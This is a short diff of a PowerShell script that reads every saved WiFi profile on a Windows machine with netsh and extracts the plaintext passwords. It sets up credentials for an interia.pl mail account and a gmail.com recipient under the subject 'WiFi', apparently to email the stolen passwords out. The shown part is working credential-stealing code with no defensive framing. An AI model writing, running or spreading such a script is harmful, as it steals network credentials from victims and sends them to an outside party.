@@ -3,6 +3,7 @@ $secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
 $user = $username + "@interia.pl"
 $cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
 $Subject = "WiFi"
+$To = $Too + "@gmail.com"
 
 $p = @()
 $p += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} 
